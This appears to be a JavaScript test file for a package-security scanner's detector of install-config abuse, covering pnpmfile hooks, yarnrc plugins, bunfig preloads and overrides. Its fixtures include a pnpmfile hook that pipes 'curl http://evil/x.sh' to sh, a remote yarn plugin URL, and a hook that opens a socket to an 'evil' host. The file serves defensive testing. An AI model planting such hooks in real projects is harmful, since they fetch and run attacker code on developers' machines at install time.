import { test } from 'node:test';
import assert from 'assert/strict';
import { scan } from '../backend/detectors/tier1-install-config-abuse.js';
import { runAll } from '../backend/detectors/index.js';

const f = (path, content) => ({ path, content });
const types = (finding) => (finding?.detail || []).map((d) => d.type);
const PKG = (extra = {}) => ({ name: 'cache-layer', version: '1.0.0', ...extra });

/* .pnpmfile.cjs */

test('D33: pnpmfile hook that rewrites scripts and dispatches is critical', () => {
  const content =
    "module.exports = { hooks: { readPackage(pkg) { const { execSync } = require('child_process'); execSync('curl http://evil/x.sh | sh'); pkg.scripts = { postinstall: 'node evil.js' }; return pkg; } } };";
  const findings = scan(PKG(), [], null, [f('.pnpmfile.cjs', content)]);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].id, 'D33-INSTALL-CONFIG-ABUSE');
  assert.equal(findings[0].severity, 'critical');
  assert.ok(types(findings[0]).includes('pnpmfile_mutates_and_dispatches'));
});

test('D33: benign monorepo pnpmfile hook scores nothing', () => {
  const content =
    'module.exports = { hooks: { readPackage(pkg) { pkg.dependencies = pkg.dependencies || {}; return pkg; } } };';
  const findings = scan(PKG(), [], null, [f('.pnpmfile.cjs', content)]);
  assert.deepEqual(findings, []);
});

/* .yarnrc.yml plugins */

test('D33: yarnrc plugin loading from a URL is flagged', () => {
  const content = 'plugins:\n  - path: https://evil.example.com/plugin.js\n    spec: evil\n';
  const findings = scan(PKG(), [], null, [f('.yarnrc.yml', content)]);
  assert.ok(findings.length > 0);
  assert.ok(types(findings[0]).includes('yarnrc_external_plugin'));
});

test('D33: yarnrc plugin pointing inside the package is not flagged', () => {
  const content =
    "plugins:\n  - path: ./.yarn/plugins/@yarnpkg/plugin-workspace.js\n    spec: '@yarnpkg/plugin-workspace'\n";
  const findings = scan(PKG(), [], null, [f('.yarnrc.yml', content)]);
  assert.deepEqual(findings, []);
});

/* bunfig.toml */

test('D33: bunfig preload is flagged', () => {
  const content = '[preload]\npreloads = ["./hook.js"]\n';
  const findings = scan(PKG(), [], null, [f('bunfig.toml', content)]);
  assert.ok(findings.length > 0);
  assert.ok(types(findings[0]).includes('bunfig_preload'));
});

test('D33: bunfig trustedDependencies alone stays below the warn threshold', () => {
  const content = '[install]\ntrustedDependencies = ["esbuild"]\n';
  const findings = scan(PKG(), [], null, [f('bunfig.toml', content)]);
  assert.deepEqual(findings, []);
});

/* overrides / resolutions */

test('D33: override resolving off-registry is flagged', () => {
  const pkg = PKG({ overrides: { lodash: 'git+ssh://git@evil.example/x.git' } });
  const findings = scan(pkg, [], null, []);
  assert.ok(findings.length > 0);
  assert.ok(types(findings[0]).includes('override_resolved_off_registry'));
});

test('D33: npm: alias override is not flagged', () => {
  const pkg = PKG({ overrides: { 'old-name': 'npm:new-name@^1.0.0' } });
  const findings = scan(pkg, [], null, []);
  assert.deepEqual(findings, []);
});

/* misc */

test('D33: reputable packages are exempt', () => {
  const content =
    "module.exports = { hooks: { readPackage(pkg) { require('child_process').execSync('id'); return pkg; } } };";
  const findings = scan({ name: 'react', version: '18.0.0' }, [], null, [
    f('.pnpmfile.cjs', content),
  ]);
  assert.deepEqual(findings, []);
});

test('D33: finding matches the standard tier-1 shape', () => {
  const content = '[preload]\npreloads = ["./hook.js"]\n';
  const [finding] = scan(PKG(), [], null, [f('bunfig.toml', content)]);
  assert.equal(finding.detector, 'tier1-install-config-abuse');
  assert.ok(['low', 'medium', 'high', 'critical'].includes(finding.severity));
  assert.ok(Array.isArray(finding.evidence));
  assert.ok(finding.locations.every((l) => typeof l.file === 'string' && l.line >= 1));
});

test('D33: surfaced through the full detector pipeline', async () => {
  const content =
    "module.exports = { hooks: { readPackage(pkg) { require('net').connect(1337,'evil'); return pkg; } } };";
  const files = [f('.pnpmfile.cjs', content)];
  const findings = await runAll(PKG(), files, null, files);
  assert.ok(findings.some((x) => x.id === 'D33-INSTALL-CONFIG-ABUSE'));
});
